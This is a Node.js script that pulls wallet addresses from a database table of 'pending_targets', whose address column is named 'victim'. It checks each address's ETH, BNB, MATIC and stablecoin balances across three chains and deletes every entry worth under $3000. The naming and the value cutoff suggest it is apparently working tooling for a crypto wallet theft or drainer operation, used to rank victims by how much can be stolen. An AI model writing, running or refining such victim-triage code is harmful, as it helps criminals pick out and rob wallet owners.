#!/usr/bin/env node
/**
 * Purge targets with balance < $3000 from pending_targets
 * 
 * Uses Alchemy's alchemy_getTokenBalances with automatic Multicall3 fallback
 * for fast multi-token balance checks across public RPCs.
 * 
 * Usage:
 *   node scripts/purge_low_balance_targets.js              # LIVE MODE (deletes)
 *   node scripts/purge_low_balance_targets.js --dry-run    # DRY RUN (preview only)
 */
import 'dotenv/config';
import { createPublicClient, http, fallback } from 'viem';
import { mainnet, bsc, polygon } from 'viem/chains';
import { createClient } from '@supabase/supabase-js';

// ─── CLI Flags ───
const isDryRun = process.argv.includes('--dry-run');
const THRESHOLD_USD = 3000;
const BATCH_SIZE = 20;
const PURGE_INTERVAL = 1000;
const DELETE_CHUNK = 500;
const RPC_TIMEOUT_MS = 15000;

console.log('\n══════════════════════════════════════════════════');
if (isDryRun) {
    console.log('  🔍 DRY-RUN MODE — No database changes will be made');
} else {
    console.log('  ⚠️  LIVE MODE — Targets below $' + THRESHOLD_USD + ' WILL BE DELETED');
    console.log(`  🗑️  Incremental deletion every ${PURGE_INTERVAL} addresses`);
}
console.log('══════════════════════════════════════════════════\n');

// ─── Supabase ───
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
if (!supabaseUrl || !supabaseKey) {
    console.error('❌ Missing NEXT_PUBLIC_SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY');
    process.exit(1);
}
const supabase = createClient(supabaseUrl, supabaseKey);

// Custom Alchemy key from env if available
const ALCHEMY_KEY = process.env.ALCHEMY_API_KEY || '';

// ─── RPC Endpoints ───
const ALL_RPCS = {
    bsc: [
        ...(ALCHEMY_KEY ? [`https://bnb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`] : []),
        'https://bsc-dataseed.binance.org',
        'https://rpc.ankr.com/bsc',
        'https://bsc.publicnode.com',
        'https://1rpc.io/bnb',
        'https://bsc.drpc.org',
    ],
    polygon: [
        ...(ALCHEMY_KEY ? [`https://polygon-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`] : []),
        'https://polygon-rpc.com',
        'https://rpc.ankr.com/polygon',
        'https://polygon.llamarpc.com',
        'https://polygon.publicnode.com',
        'https://1rpc.io/polygon',
        'https://polygon.drpc.org',
    ],
    ethereum: [
        ...(ALCHEMY_KEY ? [`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`] : []),
        'https://ethereum.publicnode.com',
        'https://eth.llamarpc.com',
        'https://rpc.ankr.com/eth',
        'https://1rpc.io/eth',
        'https://eth.drpc.org',
    ],
};

const CHAINS = {
    ethereum: {
        chain: mainnet,
        chainId: 1,
        coingeckoId: 'ethereum',
        stablecoins: {
            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
            USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
            DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
            USDP: '0x8E870D67F660D95d5be530380D0eC0bd388289E1',
            TUSD: '0x0000000000085d4780B73119b644AE5ecd22b376',
            FRAX: '0x853d955aCEf822Db058eb8505911ED77F175b99e',
        },
        decimals: { USDT: 6, USDC: 6, DAI: 18, USDP: 18, TUSD: 18, FRAX: 18, ETH: 18 },
    },
    bsc: {
        chain: bsc,
        chainId: 56,
        coingeckoId: 'binancecoin',
        stablecoins: {
            USDT: '0x55d398326f99059fF775485246999027B3197955',
            USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
            BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
            DAI: '0x1AF3F329e8BE154074D8769D1FFa4f058117F6b8',
        },
        decimals: { USDT: 18, USDC: 18, BUSD: 18, DAI: 18, BNB: 18 },
    },
    polygon: {
        chain: polygon,
        chainId: 137,
        coingeckoId: 'matic-network',
        stablecoins: {
            USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
            USDC: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
            USDCe: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
            DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
            USDP: '0x2aBE941127B1C078d5e75E7C68A0e3ae3B0b8f1D',
        },
        decimals: { USDT: 6, USDC: 6, USDCe: 6, DAI: 18, USDP: 18, MATIC: 18 },
    },
};

const CHAIN_CLIENTS = {};
for (const [name, cfg] of Object.entries(CHAINS)) {
    CHAIN_CLIENTS[name] = createPublicClient({
        chain: cfg.chain,
        transport: fallback(
            ALL_RPCS[name].map(url => http(url, { timeout: RPC_TIMEOUT_MS })),
            { retryCount: 2 }
        ),
    });
}

// Minimal ERC20 ABI for Multicall fallback
const ERC20_ABI = [
    {
        type: 'function',
        name: 'balanceOf',
        stateMutability: 'view',
        inputs: [{ name: 'account', type: 'address' }],
        outputs: [{ name: 'balance', type: 'uint256' }],
    },
];

let prices = {};

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function normalizeChain(chainStr) {
    if (!chainStr) return 'ethereum';
    const s = String(chainStr).toLowerCase().trim();
    if (['eth', 'ethereum', 'mainnet', '1'].includes(s)) return 'ethereum';
    if (['bsc', 'binance', 'bnb', '56'].includes(s)) return 'bsc';
    if (['polygon', 'matic', '137'].includes(s)) return 'polygon';
    return s;
}

async function fetchAllPendingTargets() {
    const PAGE_SIZE = 1000;
    let offset = 0;
    let all = [];
    while (true) {
        const { data, error } = await supabase
            .from('pending_targets')
            .select('id, victim, chain')
            .range(offset, offset + PAGE_SIZE - 1);
        if (error) throw new Error('Failed to fetch pending_targets: ' + error.message);
        if (!data || data.length === 0) break;
        all = all.concat(data);
        if (all.length % 5000 === 0) console.log(`  └─ Fetched ${all.length} rows...`);
        if (data.length < PAGE_SIZE) break;
        offset += PAGE_SIZE;
    }
    return all;
}

async function getNativePrices() {
    const fallbackPrices = { ethereum: 1900, binancecoin: 610, 'matic-network': 0.08 };
    try {
        const ids = Object.values(CHAINS).map(c => c.coingeckoId).join(',');
        const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
        const res = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
        if (!res.ok) throw new Error(`CoinGecko HTTP ${res.status}`);
        const data = await res.json();
        const fetched = {};
        for (const [name, cfg] of Object.entries(CHAINS)) {
            fetched[name] = data[cfg.coingeckoId]?.usd || fallbackPrices[cfg.coingeckoId] || 0;
        }
        fetched.USDT = 1; fetched.USDC = 1; fetched.BUSD = 1;
        fetched.DAI = 1; fetched.USDP = 1; fetched.TUSD = 1;
        fetched.FRAX = 1; fetched.USDCe = 1;
        return fetched;
    } catch (err) {
        console.warn(`  ⚠️ Warning: Price fetch failed (${err.message}). Fallbacks applied.`);
        return {
            ethereum: 1900, bsc: 610, polygon: 0.08,
            USDT: 1, USDC: 1, BUSD: 1, DAI: 1, USDP: 1, TUSD: 1, FRAX: 1, USDCe: 1
        };
    }
}

async function deleteBatch(ids, chainName) {
    if (ids.length === 0) return 0;
    if (isDryRun) return ids.length;

    let deleted = 0;
    for (let i = 0; i < ids.length; i += DELETE_CHUNK) {
        const chunk = ids.slice(i, i + DELETE_CHUNK);
        const { error } = await supabase
            .from('pending_targets')
            .delete()
            .in('id', chunk);
        if (error && error.code !== '42P01') {
            console.error(`  ❌ Delete error: ${error.message}`);
        } else {
            deleted += chunk.length;
        }
    }
    console.log(`\n  🗑️  Deleted ${deleted} low-balance targets from ${chainName}`);
    return deleted;
}

async function checkBalanceWithRetry(address, chainName, maxRetries = 3) {
    const cfg = CHAINS[chainName];
    if (!cfg) return { totalUsd: 0, error: 'unknown chain' };

    const client = CHAIN_CLIENTS[chainName];

    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            // 1. Fetch Native Balance
            const nativeBalPromise = client.getBalance({ address });

            // 2. Fetch Token Balances (Try Alchemy RPC method first, fallback to Multicall)
            let tokenBalancesMap = {};
            let tokenSuccess = false;

            if (ALCHEMY_KEY) {
                try {
                    const tokenAddrs = Object.values(cfg.stablecoins);
                    const tokenResult = await client.request({
                        method: 'alchemy_getTokenBalances',
                        params: [address, tokenAddrs],
                    });

                    if (tokenResult && Array.isArray(tokenResult.tokenBalances)) {
                        const symbolByAddr = {};
                        for (const [sym, addr] of Object.entries(cfg.stablecoins)) {
                            symbolByAddr[addr.toLowerCase()] = sym;
                        }
                        for (const tb of tokenResult.tokenBalances) {
                            if (!tb.tokenBalance || tb.tokenBalance === '0x0' || tb.error) continue;
                            const sym = symbolByAddr[tb.contractAddress?.toLowerCase()];
                            if (!sym) continue;
                            try {
                                tokenBalancesMap[sym] = BigInt(tb.tokenBalance);
                            } catch { }
                        }
                        tokenSuccess = true;
                    }
                } catch (e) {
                    // Alchemy failed/unavailable; falling back to Multicall
                }
            }

            // Fallback: Use Multicall3 across public RPC endpoints
            if (!tokenSuccess) {
                const tokenEntries = Object.entries(cfg.stablecoins);
                const multicallRes = await client.multicall({
                    contracts: tokenEntries.map(([, tokenAddr]) => ({
                        address: tokenAddr,
                        abi: ERC20_ABI,
                        functionName: 'balanceOf',
                        args: [address],
                    })),
                    allowFailure: true,
                });

                multicallRes.forEach((res, idx) => {
                    if (res.status === 'success' && res.result) {
                        const [sym] = tokenEntries[idx];
                        tokenBalancesMap[sym] = BigInt(res.result);
                    }
                });
            }

            const nativeBal = await nativeBalPromise;

            // Compute total USD
            let totalUsd = 0;

            // Native balance
            const nativeSymbol = chainName === 'ethereum' ? 'ETH' : chainName === 'bsc' ? 'BNB' : 'MATIC';
            const nativeDecimal = cfg.decimals[nativeSymbol] || 18;
            const nativeAmount = Number(nativeBal) / (10 ** nativeDecimal);
            const nativePrice = prices[nativeSymbol] || prices[chainName] || 0;
            totalUsd += nativeAmount * nativePrice;

            // Stablecoins balance
            for (const [sym, rawBal] of Object.entries(tokenBalancesMap)) {
                const decimals = cfg.decimals[sym] || 18;
                const amount = Number(rawBal) / (10 ** decimals);
                totalUsd += amount * (prices[sym] || 1);
            }

            return { totalUsd, nativeAmount, error: null };
        } catch (err) {
            const errMsg = err.message || String(err);
            if (attempt < maxRetries) {
                await sleep(Math.pow(2, attempt - 1) * 1000);
                continue;
            }
            return { totalUsd: 0, error: errMsg };
        }
    }

    return { totalUsd: 0, error: 'max retries exceeded' };
}

async function processChain(chainName, rows) {
    console.log(`\n🔗 Chain: ${chainName.toUpperCase()} — ${rows.length} targets`);
    console.log(`   Starting balance checks (BATCH_SIZE=${BATCH_SIZE})...`);

    let belowThreshold = 0;
    let aboveThreshold = 0;
    let errors = 0;
    let totalDeleted = 0;
    const toDelete = [];
    const sampleBelow = [];
    const sampleAbove = [];
    let checkedSinceLastPurge = 0;
    let consecutiveErrors = 0;
    const startTime = Date.now();

    for (let i = 0; i < rows.length; i += BATCH_SIZE) {
        const batch = rows.slice(i, i + BATCH_SIZE);

        const results = await Promise.all(
            batch.map(async (row) => {
                const result = await checkBalanceWithRetry(row.victim, chainName);
                return { row, ...result };
            })
        );

        for (const r of results) {
            checkedSinceLastPurge++;

            if (r.error) {
                errors++;
                consecutiveErrors++;

                if (consecutiveErrors >= 10) {
                    console.log(`\n  ⚠️  ${consecutiveErrors} consecutive errors encountered. Cooling down 5s...`);
                    await sleep(5000);
                    consecutiveErrors = 0;
                }
                continue;
            }

            consecutiveErrors = 0;

            if (r.totalUsd < THRESHOLD_USD) {
                belowThreshold++;
                toDelete.push(r.row.id);
                if (sampleBelow.length < 3) {
                    sampleBelow.push({ addr: r.row.victim, usd: r.totalUsd.toFixed(2) });
                }
            } else {
                aboveThreshold++;
                if (sampleAbove.length < 3) {
                    sampleAbove.push({ addr: r.row.victim, usd: r.totalUsd.toFixed(2) });
                }
            }
        }

        if (checkedSinceLastPurge >= PURGE_INTERVAL && toDelete.length > 0) {
            const deleted = await deleteBatch(toDelete, chainName);
            totalDeleted += deleted;
            toDelete.length = 0;
            checkedSinceLastPurge = 0;
        }

        const done = Math.min(i + BATCH_SIZE, rows.length);
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const rate = (done / (elapsed || 1)).toFixed(1);

        process.stdout.write(
            `\r  └─ Progress: ${done}/${rows.length} (${rate}/s) | Below: ${belowThreshold} | Above: ${aboveThreshold} | Pending Delete: ${toDelete.length} | Errors: ${errors}    `
        );

        await sleep(consecutiveErrors > 0 ? 300 : 20);
    }
    process.stdout.write('\n');

    if (toDelete.length > 0) {
        const deleted = await deleteBatch(toDelete, chainName);
        totalDeleted += deleted;
    }

    if (sampleBelow.length) {
        console.log(`  📉 Sample below $${THRESHOLD_USD} (${isDryRun ? 'would delete' : 'deleted'}):`);
        sampleBelow.forEach(s => console.log(`      ${s.addr}  $${s.usd}`));
    }
    if (sampleAbove.length) {
        console.log(`  📈 Sample above $${THRESHOLD_USD} (kept):`);
        sampleAbove.forEach(s => console.log(`      ${s.addr}  $${s.usd}`));
    }

    return { total: rows.length, belowThreshold, aboveThreshold, errors, deleted: totalDeleted };
}

// ─── Main ───
async function main() {
    console.log('📡 Fetching native/stablecoin prices...');
    prices = await getNativePrices();
    console.log('   Prices:', Object.entries(prices)
        .filter(([k]) => ['ethereum', 'binancecoin', 'matic-network'].includes(k))
        .map(([k, v]) => `${k}=$${v}`).join(', '));

    console.log('\n📡 Fetching all pending_targets...');
    const rows = await fetchAllPendingTargets();
    console.log(`   Total rows: ${rows.length}`);

    const byChain = {};
    for (const r of rows) {
        const c = normalizeChain(r.chain);
        if (!byChain[c]) byChain[c] = [];
        byChain[c].push(r);
    }

    const results = {};
    for (const chainName of Object.keys(CHAINS)) {
        if (!byChain[chainName] || byChain[chainName].length === 0) {
            console.log(`\n🔗 Chain: ${chainName.toUpperCase()} — 0 targets (skipped)`);
            continue;
        }
        results[chainName] = await processChain(chainName, byChain[chainName]);
    }

    console.log('\n══════════════════════════════════════════════════');
    console.log('  FINAL SUMMARY');
    console.log('══════════════════════════════════════════════════');
    let totalTargets = 0, totalBelow = 0, totalAbove = 0, totalErrors = 0, totalDeleted = 0;
    for (const [chain, r] of Object.entries(results)) {
        console.log(`\n  ${chain.toUpperCase()}:`);
        console.log(`    Total targets:    ${r.total}`);
        console.log(`    Below $${THRESHOLD_USD}:     ${r.belowThreshold}`);
        console.log(`    Above $${THRESHOLD_USD}:     ${r.aboveThreshold}`);
        console.log(`    RPC errors:       ${r.errors}`);
        console.log(`    ${isDryRun ? 'Would delete' : 'Deleted'}:   ${r.deleted}`);
        totalTargets += r.total;
        totalBelow += r.belowThreshold;
        totalAbove += r.aboveThreshold;
        totalErrors += r.errors;
        totalDeleted += r.deleted;
    }
    console.log('\n  ── GRAND TOTAL ──');
    console.log(`    Total:     ${totalTargets}`);
    console.log(`    Below:     ${totalBelow} (${totalTargets ? ((totalBelow / totalTargets) * 100).toFixed(1) : 0}%)`);
    console.log(`    Above:     ${totalAbove} (${totalTargets ? ((totalAbove / totalTargets) * 100).toFixed(1) : 0}%)`);
    console.log(`    Errors:    ${totalErrors}`);
    console.log(`    ${isDryRun ? 'Would delete' : 'Deleted'}:  ${totalDeleted}`);
    console.log('\n══════════════════════════════════════════════════\n');

    if (isDryRun) {
        console.log('🔍 DRY-RUN COMPLETE — Run without --dry-run to apply database deletions.\n');
    }
}

main().catch(err => {
    console.error('❌ Fatal error:', err);
    process.exit(1);
});